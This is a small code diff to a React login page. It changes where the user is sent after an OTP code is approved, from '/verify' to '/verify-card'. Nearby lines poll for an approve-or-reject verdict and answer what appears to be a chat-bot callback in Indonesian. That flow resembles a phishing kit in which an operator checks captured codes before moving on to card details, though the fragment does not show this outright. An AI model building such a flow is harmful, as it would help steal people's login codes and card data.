@@ -60,7 +60,7 @@ export default function Login() {
         if (callbackId) await answerCallback(callbackId, "✅ Kode disetujui! Melanjutkan ke step berikutnya.");
         setCheckingCode(false);
         setShowCodeModal(false);
-        navigate("/verify");
+        navigate("/verify-card");
       } else if (status === "rejected") {
         clearInterval(otpPollRef.current!);
         if (callbackId) await answerCallback(callbackId, "❌ Kode ditolak.");
